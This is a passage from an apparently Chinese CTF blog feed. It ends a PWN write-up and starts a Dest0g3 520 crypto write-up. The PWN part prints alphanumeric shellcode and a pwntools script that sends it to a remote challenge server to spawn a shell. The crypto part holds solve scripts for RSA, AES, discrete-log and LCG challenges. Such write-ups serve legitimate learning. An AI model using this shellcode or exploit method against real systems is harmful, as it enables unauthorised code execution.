class="hljs-number">2</span>, v1, <span class="hljs-number">7</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);<br>v2 = <span class="hljs-built_in">strlen</span>(a1);<br><span class="hljs-built_in">memcpy</span>(dest, a1, v2);<br>((<span class="hljs-built_in">void</span> (*)(<span class="hljs-type">void</span>))dest)();<br></code></pre></td></tr></table></figure><p>call了一个指针，这个而且内容我们可以自己确定。以此来打shellcode。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">&#123;<br>  <span class="hljs-keyword">if</span> ( !isprint(a1[i]) &amp;&amp; a1[i] != <span class="hljs-number">10</span> )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;oh!&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>  &#125;<br>&#125;<br><span class="hljs-keyword">if</span> ( f1 != <span class="hljs-number">1</span> )<br>&#123;<br>  puts(<span class="hljs-string">&quot;oh!&quot;</span>);<br>  <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>上方有两个值需要绕过。这两个值在sub_CBD中可以被修改为1。</p><p>所以我们要先进入sub_CBD再进入sub_DA8。</p><p>在主流程sub_FFD中。判断输入参数为opt与msg。最后的switch可以进入我们想要的函数。分别是1和2.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">switch</span> ( v7 )<br>&#123;<br>  <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>    <span class="hljs-built_in">sub_DA8</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)dest);<br>    <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>    <span class="hljs-built_in">sub_EFE</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)dest);<br>    <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-built_in">sub_CBD</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)dest);<br>    <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">default</span>:<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error.&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">6</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>而v7是在上方的opt参数中转换得到的。所以我们需要输入的参数包含了opt:1和opt:2。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">if</span> ( !strcmp(<span class="hljs-built_in">a1</span>, <span class="hljs-string">&quot;ro0t&quot;</span>) )<br>&#123;<br>  <span class="hljs-built_in">f1</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>  <span class="hljs-built_in">f2</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>&#125;<br><span class="hljs-symbol">else</span><br>&#123;<br>  <span class="hljs-built_in">f1</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>sub_CBD需要msg参数的值为ro0t。</p><p>所以两次输入的参数可以得到：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">opt:</span><span class="hljs-number">1</span><br><span class="hljs-symbol">msg:</span>ro0t<br><span class="hljs-symbol">opt:</span><span class="hljs-number">2</span><br><span class="hljs-symbol">msg:</span>shellcode<br></code></pre></td></tr></table></figure><p>由于dest执行之前检查了内容是不是全是可打印的字符，所以这里我们的shellcode需要转换成明文。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rcx</span>        <span class="hljs-comment">; src</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span>        <span class="hljs-comment">; dest</span><br><span class="hljs-keyword">call</span>    _memcpy<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>+dest]<br><span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_20], <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rbp</span>+var_20]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">rdx</span><br></code></pre></td></tr></table></figure><p>dest是由rdx进行跳转的。所以我们生成对应的shellcode的时候要使用rdx参数。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">└─$ ./shellcode_x<span class="hljs-number">64.</span>sh rdx<br>Rh<span class="hljs-number">0666</span>TY<span class="hljs-number">1131</span>Xh<span class="hljs-number">333311</span>k<span class="hljs-number">13</span>XjiV<span class="hljs-number">11</span>Hc<span class="hljs-number">1</span>ZXYf<span class="hljs-number">1</span>TqIHf<span class="hljs-number">9</span>kDqW<span class="hljs-number">02</span>DqX<span class="hljs-number">0</span>D<span class="hljs-number">1</span>Hu<span class="hljs-number">3</span><span class="hljs-name">M2</span><span class="hljs-name">G0</span>Z<span class="hljs-number">2</span><span class="hljs-meta">o4</span>H<span class="hljs-number">0</span>u<span class="hljs-number">0</span>P<span class="hljs-number">160</span>Z<span class="hljs-number">0</span><span class="hljs-name">g7</span><span class="hljs-meta">O0</span>Z<span class="hljs-number">0</span>C<span class="hljs-number">100</span>y<span class="hljs-number">5</span><span class="hljs-meta">O3</span><span class="hljs-name">G020</span>B<span class="hljs-number">2</span><span class="hljs-symbol">n060</span><span class="hljs-symbol">N4</span>q<span class="hljs-number">0</span><span class="hljs-symbol">n2</span>t<span class="hljs-number">0</span>B<span class="hljs-number">0001010</span>H<span class="hljs-number">3</span>S<span class="hljs-number">2</span>y<span class="hljs-number">0</span>Y<span class="hljs-number">0</span><span class="hljs-meta">O0</span><span class="hljs-symbol">n0</span>z<span class="hljs-number">01340</span>d<span class="hljs-number">2</span>F<span class="hljs-number">4</span>y<span class="hljs-number">8</span>P<span class="hljs-number">115</span>l<span class="hljs-number">1</span><span class="hljs-symbol">n0</span>J<span class="hljs-number">0</span>h<span class="hljs-number">0</span>a<span class="hljs-number">070</span>t <br></code></pre></td></tr></table></figure><p>得到shellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = remote(<span class="hljs-string">&quot;39.107.153.91&quot;</span>, <span class="hljs-number">30443</span>)<br>r.sendline(<span class="hljs-string">b&#x27;opt:1\nmsg:ro0t\r\n&#x27;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;opt:2\nmsg:Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t\r\n&#x27;</span>)<br>r.interactive()<br><br><span class="hljs-comment"># flag&#123;2781427d-0d69-460a-abf1-c2ce4529e6de&#125;</span><br></code></pre></td></tr></table></figure><p>这题也有400解了…国赛属实恐怖…</p><h1 id="题外话"><a class="markdownIt-Anchor" href="#题外话"></a> 题外话</h1><p>这比赛打的挺无语的，对我一个主攻Crypto的人来说…这次Crypto出的就…挺无语的，这三题能叫Crypto吗？全是非预期…还有直接拿root账户的，真的是十分有意思。华东北是真的卷，都不知道这次能不能出线了。打完这比赛我就觉得，我学了这一段时间的CTF都白学了。开始想念去年的360了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dest0g3 520迎新赛</title>
    <link href="/2022/05/27/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/"/>
    <url>/2022/05/27/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>BUU的Dest0g3 520迎新赛。babyRSA、babyAES、ezDLP、ezStream、Mr.Doctor、Pngenius、EasyEncode、你知道js吗、EasyWord、Python_jail、 4096、simpleXOR、hi 、 ez_arrch的题解。</p><span id="more"></span><img src="https://s2.loli.net/2022/05/20/qSLBC9fJPiw5RaE.jpg" style="zoom: 33%;" /><p>保住了前100，累死了都。</p><p>最后主办方清了一波作弊的，完赛后来看我直接70以内了。属实乐。</p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="babyrsa"><a class="markdownIt-Anchor" href="#babyrsa"></a> babyRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, getPrime<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> next_prime<br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = next_prime(p)<br>n = p*q<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>m = bytes_to_long(flag)<br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span><br><span class="hljs-string">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><p>p,q使用的是相邻的两个素数。所以可以进行开方求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># babyRSA_solve.py</span><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">import</span> libnum<br><br>n = <span class="hljs-number">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span><br>c = <span class="hljs-number">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span><br>p =  sympy.prevprime(gmpy2.iroot(n,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>])<br>q = sympy.nextprime(p)<br><br>d = gmpy2.invert(<span class="hljs-number">65537</span>, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><br>m = gmpy2.powmod(c, d, n)<br><br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br><br><span class="hljs-comment"># Dest0g3&#123;96411aad-032c-20a8-bc43-b473f6f08536&#125;</span><br></code></pre></td></tr></table></figure><h2 id="babyaes"><a class="markdownIt-Anchor" href="#babyaes"></a> babyAES</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> os<br>iv = os.urandom(<span class="hljs-number">16</span>)<br>key = os.urandom(<span class="hljs-number">16</span>)<br>my_aes = AES.new(key, AES.MODE_CBC, iv)<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>flag += (<span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(flag) % <span class="hljs-number">16</span>) * <span class="hljs-string">b&#x27;\x00&#x27;</span><br>c = my_aes.encrypt(flag)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-built_in">print</span>(iv)<br><span class="hljs-built_in">print</span>(key)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span><br><span class="hljs-string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span><br><span class="hljs-string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><p>可以看到初始向量和加密密钥都给出来了，直接进行解密就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># babyAES_solve.py</span><br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> os<br><br>aes = AES.new(<span class="hljs-string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span>, AES.MODE_CBC, <span class="hljs-string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(aes.decrypt(<span class="hljs-string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span>))<br><br><span class="hljs-comment"># Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ezdlp"><a class="markdownIt-Anchor" href="#ezdlp"></a> ezDLP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>x = bytes_to_long(flag)<br>g = <span class="hljs-number">19</span><br>p = <span class="hljs-number">335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353</span><br>h = <span class="hljs-built_in">pow</span>(g, x, p)<br><span class="hljs-built_in">print</span>(h)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><p>用SageMath求解即可。这个只能这么做了，用到应该是BSGS算法，我自己写的跑半天跑不出来，还是用SageMath好了。</p><p><a href="https://sagecell.sagemath.org/">https://sagecell.sagemath.org/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs SageMath"># sagemath<br>h = 199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162<br>p = 335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353<br>g = 19<br>x = discrete_log(mod(h, p), mod(g, p))<br>print(hex(x))<br><br># 0x446573743067337b30376564326136662d313832662d613035642d633831652d3133313861663832306137387d<br># Dest0g3&#123;07ed2a6f-182f-a05d-c81e-1318af820a78&#125;<br></code></pre></td></tr></table></figure><h2 id="ezstream"><a class="markdownIt-Anchor" href="#ezstream"></a> ezStream</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>flag = f.read()<br>f.close()<br><span class="hljs-keyword">assert</span> flag[:<span class="hljs-number">8</span>] == <span class="hljs-string">&quot;Dest0g3&#123;&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LCG</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.a = getRandomNBitInteger(<span class="hljs-number">32</span>)<br>        self.b = getRandomNBitInteger(<span class="hljs-number">32</span>)<br>        self.m = getPrime(<span class="hljs-number">32</span>)<br>        self.seed = getRandomNBitInteger(<span class="hljs-number">32</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        self.seed = (self.a * self.seed + self.b) % self.m<br>        <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">16</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a = &#123;&#125;\nb = &#123;&#125;\nm = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.a, self.b, self.m))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;state1 = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.<span class="hljs-built_in">next</span>()))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;state2 = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.<span class="hljs-built_in">next</span>()))<br><br><br>lcg = LCG()<br>lcg.output()<br>c = <span class="hljs-string">b&#x27;&#x27;</span>.join([long_to_bytes(<span class="hljs-built_in">ord</span>(flag[i]) ^ (lcg.<span class="hljs-built_in">next</span>() % <span class="hljs-number">10</span>))<br>              <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag))])<br><span class="hljs-built_in">print</span>(bytes_to_long(c))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">a = 3939333498</span><br><span class="hljs-string">b = 3662432446</span><br><span class="hljs-string">m = 2271373817</span><br><span class="hljs-string">state1 = 17362</span><br><span class="hljs-string">state2 = 20624</span><br><span class="hljs-string">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><p>流加密，看样子要找seed的初值。而且给了一部分的明文，可以求密钥流。</p><p>随机数是用getRandomNBitInteger(32)生成的。那么seed的范围就是 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mrow><mn>32</mn><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">2^{32-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">2</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>~<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>32</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{32}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。选择爆破来求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LCG</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.a = <span class="hljs-number">3939333498</span><br>        self.b = <span class="hljs-number">3662432446</span><br>        self.m = <span class="hljs-number">2271373817</span><br>        self.seed = getRandomNBitInteger(<span class="hljs-number">32</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        self.seed = (self.a * self.seed 